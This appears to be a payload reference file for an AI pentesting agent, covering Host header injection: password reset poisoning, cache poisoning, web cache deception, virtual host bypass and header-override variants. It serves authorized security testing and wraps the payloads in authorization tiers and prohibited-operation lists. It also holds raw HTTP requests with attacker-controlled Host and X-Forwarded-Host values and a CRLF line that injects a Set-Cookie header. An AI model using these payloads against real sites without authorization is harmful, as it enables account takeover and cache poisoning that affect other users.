# Host Header Injection Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify Host header injection vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual phishing/cache poisoning is prohibited
> - Host header payloads are for understanding attack surface only, **no malicious redirects**
> - Validation proves vulnerability existence (Host header used), **no actual poisoning executed**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test password reset links, cache poisoning, and virtual host routing**

---

## Validation Objectives (Within Security Boundary)

Host header injection vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Host Header Manipulation | ✓ Test with external controlled host (Collaborator) | - | Poison real cache |
| Password Reset Link | ✓ Check if link uses Host | ✓ Send reset to attacker host | Capture real reset tokens |
| Absolute URL Generation | ✓ Check URL construction | - | Create phishing links |
| Virtual Host Bypass (external) | ✓ Test with Collaborator subdomain | - | - |
| Virtual Host Bypass (internal) | ❌ Not by default | ✓ Requires explicit authorization | Access restricted vhost without auth |

**Safe Validation Method**: Send requests with modified Host header to Collaborator; observe if Host header appears in generated content or reset links.

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | External Collaborator host, URL generation checks | No authorization needed |
| **Tier 2: Authorized Extended** | Internal/admin vhost probing, password reset to attacker | User explicit authorization required |
| **Tier 3: Theory Reference** | Cache poisoning concepts, phishing scenarios | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming Host header is used in URL generation or links.

---

## Basic Host Header Injection

### Standard Test

```bash
# Normal request
GET / HTTP/1.1
Host: target.com

# Modified Host header
GET / HTTP/1.1
Host: YOUR_COLLABORATOR

# Check if:
# 1. Response contains absolute URLs with injected Host
# 2. Password reset links use injected Host
# 3. Cache key includes Host (cache poisoning possible)
```

---

## Attack Scenarios

### 1. Password Reset Poisoning

```bash
# Request password reset with modified Host
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=user@target.com

# If reset link uses Host header:
https://evil.com/reset?token=abc123

# Reset link sent to evil.com domain (attacker receives token)
```

**Boundary**: Test with Collaborator to prove flaw exists; do not capture real user tokens.

### 2. Cache Poisoning

```bash
# Request with injected Host
GET /page HTTP/1.1
Host: evil.com

# If response cached with Host in cache key:
# Future users requesting /page get evil.com content
# Or absolute URLs pointing to evil.com

# Check if cache stores injected Host response
```

**Boundary**: Do not poison real production cache; test in staging or document vulnerability only.

### 3. Web Cache Deception

```bash
# Request static file with path that doesn't exist
GET /profile.css HTTP/1.1
Host: target.com

# If cache stores profile.css but page returns profile content:
# Sensitive user data cached as static file
# Attacker can retrieve cached data without auth
```

### 4. Virtual Host Bypass

#### Tier 1: External Host Test (Default - Safe)

```bash
# Test with external controlled host (Collaborator)
GET / HTTP/1.1
Host: YOUR_COLLABORATOR

# Purpose: Check if Host header influences routing or content
# Safe: Uses external marker domain, no internal access
```

#### Tier 2: Internal/Admin Host Test (Requires Authorization)

**⚠️ IMPORTANT**: Testing internal or admin virtual hosts is NOT a default validation step. Accessing internal hosts may expose restricted content without proper authorization.

**Authorization Requirements** (all must be met):
1. User explicitly authorizes internal vhost probing in writing
2. Target hosts: only specifically authorized internal/admin subdomains
3. Report: mark "Internal vhost probing executed with user authorization"

**Theoretical Examples** (do not execute without authorization):

```bash
# Access internal virtual host - requires authorization
GET / HTTP/1.1
Host: internal.target.com

# Or admin subdomain - requires authorization
GET / HTTP/1.1
Host: admin.target.com

# If routing based on Host header only:
# Can access internal/admin content without proper access
```

**Default Validation**: Only use external Collaborator host to prove Host header influences routing. Stop here - existence is proven.

---

## Host Header Bypass Techniques

### Multiple Host Headers

```bash
GET / HTTP/1.1
Host: target.com
Host: evil.com

# Some servers use first, some use last
# Test which one is processed
```

### Absolute URL in Request Line

```bash
GET https://evil.com/page HTTP/1.1
Host: target.com

# Some servers use URL in request line
# Ignores Host header
```

### X-Forwarded-Host

```bash
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Reverse proxy may use X-Forwarded-Host
# Backend uses forwarded value
```

### X-Host Header Variations

```bash
X-Host: evil.com
X-Forwarded-Host: evil.com
X-Host-Override: evil.com
Forwarded: host=evil.com
X-Original-Host: evil.com
```

### CRLF Injection in Host

```bash
Host: target.com%0d%0aSet-Cookie: injected=true
Host: target.com\r\nSet-Cookie: injected=true

# Can inject additional headers via CRLF
```

---

## Detection Methods

### Absolute URL Detection

```bash
# Check response for absolute URLs containing Host
GET / HTTP/1.1
Host: evil.com

# Search response for:
- href="https://evil.com/..."
- src="https://evil.com/..."
- Location: https://evil.com/...
- Content-Disposition: ... evil.com
```

### Link Generation Test

```bash
# Request page with Host modification
GET /login HTTP/1.1
Host: evil.com

# Check if login form action uses evil.com:
<form action="https://evil.com/auth/login">
```

### Email Content Test

```bash
# Trigger email (password reset, notification)
POST /reset-password HTTP/1.1
Host: evil.com

# Check email content (if accessible):
# Reset link should contain evil.com if vulnerable
```

---

## Analysis Process

### Tier 1: Default Validation (Safe)

1. Identify endpoints that generate absolute URLs (forms, redirects, emails)
2. Send request with Host header set to Collaborator
3. Check response for absolute URLs containing injected Host
4. Test X-Forwarded-Host variations if reverse proxy present
5. **Stop validation**, document Host header usage flaws

### Tier 2: Authorized Extended (Requires User Authorization)

6. Test password reset endpoint with modified Host -> **requires authorization** (triggers actual email)
7. Test cache behavior -> **requires authorization** (may affect production cache)
8. Test internal/admin virtual hosts -> **requires authorization** (may access restricted content)

**Prohibited**:
- Do not poison production cache
- Do not capture real reset tokens
- Do not access internal hosts without authorization

---

## Output

```markdown
## Vulnerability: Host Header Injection

### Location
{URL} - {affected endpoint}

### Vulnerability Type
{Password Reset Poisoning / Cache Poisoning / Absolute URL / Virtual Host}

### Proof Payload
Host: YOUR_COLLABORATOR

### Validation Result
- Host header accepted: ✓ Yes
- Absolute URLs: ✓ Contains injected Host
- Collaborator callback: {received/not received}

### Risk Level
{Low by default — see chain-closure assessment below}

### Chain-Closure Assessment

Host header injection impact depends entirely on**whether downstream components actually consume the Host header**. Host header being accepted != being exploitable. Default **Low**, Only whenthe corresponding scenario closure conditions are met:

| scenario | Default | Upgrade condition (all met) |
|------|------|-------------------|
| password reset poisoning | Low | -> Critical:1)reset link is built from the Host header (not a fixed domain/configuration)2)email is actually sent and contains the poisoned link 3)reset-link takeover = account takeover |
| cache poisoning | Low | -> High:1)shared cache exists in front of the target (CDN/reverse proxy)2)the poisoned response is cached 3)other users are affected |
| absolute URL disclosure | Low | -> Medium:1)email/external link/notification uses the polluted absolute URL 2)reaches real users |
| virtual host access | Low | -> Medium:1)internal/admin vhost actually exists 2)access control is bypassed |

**Chain-break point record** (mandatory):state which closure condition is unmet. common break points are - 
- reset link uses fixed-domain configuration, does not take the Host header (scenario 1 breaks)
- site connects directly to originno shared cache layer (scenario 2 breaks)

Host header is accepted by the server but not consumed downstream, record only Low/Info, do not report High. 
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Poison production cache | Do not modify real user-facing cache |
| ❌ Capture real reset tokens | Do not intercept actual password reset emails |
| ❌ Create phishing pages | Do not set up evil.com with clone of target |
| ❌ Social engineering | Do not combine with phishing attacks |
| ❌ Access internal hosts | Do not use vhost bypass for unauthorized access |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Data create/update/delete | Ask first"